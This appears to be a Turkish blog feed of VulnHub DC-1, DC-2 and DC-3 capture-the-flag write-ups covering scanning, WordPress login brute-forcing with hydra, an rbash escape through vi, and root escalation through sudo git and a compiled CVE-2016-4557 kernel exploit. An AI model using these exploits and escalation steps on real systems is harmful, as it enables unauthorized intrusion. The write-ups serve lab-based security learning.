-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38932</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping
-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">105004</span> Mar <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> /usr/lib/snapd/snap-confine
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">13960</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38300</span> Mar  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2017</span> /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">513528</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> /usr/lib/openssh/ssh-keysign
-rwsr-xr-- <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">46436</span> Oct <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">5480</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">53128</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/passwd
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgidmap
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">78012</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/gpasswd
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">159852</span> May <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2017</span> /usr/bin/sudo
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18216</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/bin/pkexec
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">39560</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chsh
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">48264</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chfn
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newuidmap
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34680</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgrp
-rwsr-sr-x <span style="color:#ae81ff">1</span> daemon daemon <span style="color:#ae81ff">50748</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2016</span> /usr/bin/at

<span style="color:#75715e">### SCAN COMPLETE ####################################</span>
</code></pre></div><p>Kernel sürümünün eski olduğu görülmektedir. İlk olarak Dirty-COW adı verilen zafiyet ile yetki yükseltilmeye çalışılmıştır. Ancak www-data kullanıcısı login işlemine kapalı olduğundan /etc/passwd üzerinde yapılan her değişiklikten sonra sistem crash olmuştur.</p>
<p><em>Linux Kernel 4.4.x çekirdeğine sahip Ubuntu 16.x sisteminde “Linux Kernel 4.4.x (Ubuntu 16.04) – ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation” isimli CVE-2016-4557 ID’li kritik bir zafiyet bulunmaktadır.</em> Searchsploit üzerinde arama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit Linux Kernel 4.4.x
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 4.4.x <span style="color:#f92672">(</span>Ubuntu 16.04<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;double-fdput()&#39;</span> bpf<span style="color:#f92672">(</span>BPF_PROG_LOAD<span style="color:#f92672">)</span> Privilege Escalat | linux/local/39772.txt
</code></pre></div><p>Searchsploit üzerinden exploit bilgisayara indirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m <span style="color:#ae81ff">39772</span>
</code></pre></div><p>İndirilen exploit dosyası localhosttan hedef makinaya indirilir. Daha sonra zip ve tar arşiv dosyaları çıkarılır.</p>
<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls -lsa
ls -lsa
total 28
4 drwxr-x--- 2 www-data www-data 4096 Apr 26  2016 .
4 drwxr-xr-x 4 www-data www-data 4096 Sep 29 08:29 ..
4 -rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh
8 -rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c
4 -rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c
4 -rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)&quot;&quot;
               ^
</code></pre><p>Derleme sonucu oluşturulan binary dosyası çalıştırılarak yetki yükseltme işlemi tamamlanır.</p>
<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
cd /root
root@DC-3:/root# ls
ls
the-flag.txt
</code></pre>
    <img src="/images/vulnhub/dc3/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-2 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-2-write-up/</link>
            <pubDate>Mon, 28 Sep 2020 14:55:50 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-2-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan DC-2 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  Nmap ile portlar ve portlarda çalışan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.109  192.168.56.109 dc-2 /etc/hosts dosyasına eklenir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/dc-2,311/">VULNHUB</a> &lsquo;da yer alan DC-2 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc2/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap ile portlar ve portlarda çalışan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.109
</code></pre></div>
    <img src="/images/vulnhub/dc2/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><code>192.168.56.109   dc-2</code> <strong>/etc/hosts</strong> dosyasına eklenir. 80 portunda çalışan web servisine tarayıcından istek atılır. Wordpress uygulamasının çalıştığı görülmektedir.</p>

    <img src="/images/vulnhub/dc2/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Site içerisinde yer alan flag sekmesine tıklanarak ilk flag elde edilir.</p>

    <img src="/images/vulnhub/dc2/flag1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Rockyou wordlistinin bir işe yaramayacağı ile ilgili bir not bırakılmış gözüküyor. <strong>Cewl</strong> aracı kullanılarak web sitesinde yer alan metinlerden wordlist oluşturulur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cewl -d <span style="color:#ae81ff">3</span> -m <span style="color:#ae81ff">5</span> http://dc-2/ -w Wordlist_dc_2.lst
<span style="color:#75715e"># -d derinlik</span> 
<span style="color:#75715e"># -m minumum kelime uzunluğu</span>
</code></pre></div><p>Oluşturulan wordlistin bir kısmı aşağıdaki gibidir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">─[barcode@parrot]─[~]$ cat Wordlist_dc_2.lst 
vitae
luctus
content
Donec
turpis
Aenean
tincidunt
finibus
dictum
egestas
volutpat
...
...
</code></pre></div><p>Web dizin taraması gerçekleştilir. Wordpress dosyaları haricinde herhangi bir farklı dosya görülmemektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://dc-2/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://dc-2/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/09/25 07:46:56 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/index.php (Status: 301)
/license.txt (Status: 200)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-config.php (Status: 200)
/wp-login.php (Status: 200)
/wp-trackback.php (Status: 200)
===============================================================
2020/09/25 07:47:09 Finished

</code></pre><p>Wordpress için kullanılan wpscan aracı ile tarama gerçekleştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://dc-2/ --enumerate
</code></pre></div><p>Tarama sonucunda 3 adet kullanıcı adı tespit edilir. Ayrıca wordpress sürümünün 4.7.10 olduğu görülmektedir.</p>

    <img src="/images/vulnhub/dc2/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Elde edilen kullanıcı adları ile user.txt adında bir wordlist oluşturulur. Daha sonra hydra aracı ile wordpress admin paneline brute-force saldırısı yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -L user.txt -P ./Wordlist_dc_2.lst dc-2 -V http-form-post <span style="color:#e6db74">&#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</span>
</code></pre></div>
    <img src="/images/vulnhub/dc2/tom.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/vulnhub/dc2/jerry.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Jerry kullanıcısı ile login olunur. Pages sekmesine tıklanır ve mevcut sayfalar listelenir.</p>

    <img src="/images/vulnhub/dc2/pages.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Flag2 sayfasına tıklanır. <em><strong>(Wordpress 4.7.10 sürümünde gizli sayfaların görüntülenmesini sağlayan bir zafiyet bulunmaktadır. http://dc-2/?static=1&amp;order=asc)</strong></em></p>

    <img src="/images/vulnhub/dc2/flag2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra dosya media sekmesinden dosya upload edilemeye çalışıldığında kullanıcının buna yetkili olmadığı tespit edilir. 😣</p>

    <img src="/images/vulnhub/dc2/notupload.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Elde edilen parola bilgileri ssh servisinde denenir ve tom kullanıcı için ssh bağlantısı sağlanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -p <span style="color:#ae81ff">7744</span> tom@192.168.56.109
</code></pre></div>
    <img src="/images/vulnhub/dc2/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Terminal ekranında cd vb. birçok komut çalıştırılamamaktadır. Shell türüne bakıldığında rbash olduğu görülmektedir.</p>

    <img src="/images/vulnhub/dc2/bash.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>İlk olarak çalıştırılabilir komutlar tespit edilir. Dizinde listeleme yapılır. Ayrıca <code>echo $PATH</code> komutu ile path dizini tespit edilir. <em><strong>/home/tom/usr/bin</strong></em> klasörü içerisinde tom kullanıcısın çalıştırabileceği komutlar yer almaktadır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tom@DC-2:~$ cd usr
-rbash: cd: restricted

tom@DC-2:~$ ls -lsa
total <span style="color:#ae81ff">76</span>
 <span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom  tom   <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">28</span> 07:19 .
 <span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ..
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom   <span style="color:#ae81ff">1200</span> Sep <span style="color:#ae81ff">28</span> 07:38 .bash_history
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_login
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_logout
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_profile
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bashrc
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">95</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> flag3.txt
 <span style="color:#ae81ff">4</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">79</span> Sep <span style="color:#ae81ff">28</span> 07:31 .lesshst
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .profile
<span style="color:#ae81ff">12</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom  <span style="color:#ae81ff">12288</span> Sep <span style="color:#ae81ff">27</span> 13:32 .swo
<span style="color:#ae81ff">12</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom  <span style="color:#ae81ff">12288</span> Sep <span style="color:#ae81ff">27</span> 13:13 .swp
 <span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom  tom   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> usr

tom@DC-2:~$ ls -lsa usr
total <span style="color:#ae81ff">12</span>
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">28</span> 07:19 ..
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">2</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> bin

tom@DC-2:~$ ls -lsa usr/bin
total <span style="color:#ae81ff">8</span>
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">2</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ..
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">13</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> less -&gt; /usr/bin/less
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom    <span style="color:#ae81ff">7</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ls -&gt; /bin/ls
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">12</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> scp -&gt; /usr/bin/scp
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">11</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> vi -&gt; /usr/bin/vi
</code></pre></div><p>Vi uygulaması içerisinden bash set edilerek shell değiştirilebilmektedir. Vi uygulaması açılır. Aşağıda yer alan komutlar sıra ile girilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">:set shell=/bin/bash
:shell
</code></pre></div><p>işlem sonunda bash kabuğuna geçilir.  PATH değişkeni /bin ve /usr/bin olacak şekilde ayarlanır.</p>

    <img src="/images/vulnhub/dc2/path.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra tom kullanıcısının home dizininde yer alan flag3.txt okunur.</p>

    <img src="/images/vulnhub/dc2/flag3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Jerry kullanıcısının home dizininde yer alan flag4.txt okunur.</p>

    <img src="/images/vulnhub/dc2/flag4.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Sudo -l komutu ile <strong>Tom</strong> kullanıcısının yetkileri kontrol edildiğinde sudo grubuna üye olmadığı/sudoers dosyasında bulunmadığı tespit edilir. Jerry kullacısına <code>su jerry</code> ile geçiş yapılır. Parola bilgisi olarak wordpress panel giriş şifresi denendiğinde başarılı olunur. 😎</p>
<p>Jerry kullanıcısı için sudo yetkileri kontrol edildiğinde, git uygulamasını parola girmeden root yetkisi ile çalıştırabildiği görülmektedir.</p>

    <img src="/images/vulnhub/dc2/git.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Git uygulaması sudo yetkisi ile çalıştırılır ve aşağıda yeralan komutlar girilerek yüksek yetkili bash kabuğuna geçilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo git help config
!/bin/bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@DC-2:/# cd /root
root@DC-2:~# ls -lsa
total <span style="color:#ae81ff">32</span>
<span style="color:#ae81ff">4</span> drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">21</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> ..
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">207</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_history
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">427</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> final-flag.txt
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">46</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .lesshst
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">232</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .mysql_history
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">140</span> Nov <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2007</span> .profile
</code></pre></div><p>final-flag.txt değeri okunarak çözüm işlemi tamalanır.</p>

    <img src="/images/vulnhub/dc2/finalflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-1 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-1-write-up/</link>
            <pubDate>Sat, 26 Sep 2020 15:05:32 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-1-write-up/</guid>
            <description>Merhaba, VULNHUB &amp;lsquo;da yer alan DC-1 adlı makinanın çözümüyle karşınızdayım. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.107  80 portunda çalışan web servisine tarayıcından istek atılır.</description>
            <content type="html"><![CDATA[<p>Merhaba, <a href="https://www.vulnhub.com/entry/dc-1,292/">VULNHUB</a> &lsquo;da yer alan DC-1 adlı makinanın çözümüyle karşınızdayım. Keyifli okumalar&hellip;</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.107
</code></pre></div>
    <img src="/images/vulnhub/dc1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>80 portunda çalışan web servisine tarayıcından istek atılır. Ayrıca http-generator  bilgisinde Drupal 7 yazmaktadır. Google ile yapılan aramada CMS yazılımı olduğu görülmektedir.</p>

    <img src="/images/vulnhub/dc1/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>Web dizin taraması gerçekleştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirb/common.txt
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://192.168.56.107
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
<span style="color:#f92672">===============================================================</span>
2020/09/24 10:03:45 Starting gobuster
<span style="color:#f92672">===============================================================</span>
/.history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.hta <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.bash_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.git/HEAD <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.forward <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.cvsignore <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.cvs <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.config <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.cache <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.bashrc <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.perf <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.passwd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.profile <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.mysql_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.rhosts <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.listings <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
